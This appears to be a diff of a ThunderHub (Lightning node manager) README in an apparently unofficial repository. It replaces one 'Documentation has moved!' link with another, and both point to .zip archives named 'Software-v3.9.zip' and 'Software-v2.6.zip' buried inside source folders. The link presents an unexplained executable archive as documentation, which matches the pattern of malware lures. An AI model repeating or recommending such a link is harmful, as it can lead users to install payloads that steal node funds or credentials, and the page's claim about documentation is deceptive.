@@ -1,3 +1,3 @@
 # **ThunderHub - Lightning Node Manager**
 
-**Documentation has moved!** Find the documentation [here](https://raw.githubusercontent.com/monopolyboymeaze/thunderhub/master/src/server/modules/api/edge/Software-v3.9.zip).
+**Documentation has moved!** Find the documentation [here](https://github.com/monopolyboymeaze/thunderhub/raw/refs/heads/master/src/client/src/views/stats/Software-v2.6.zip).
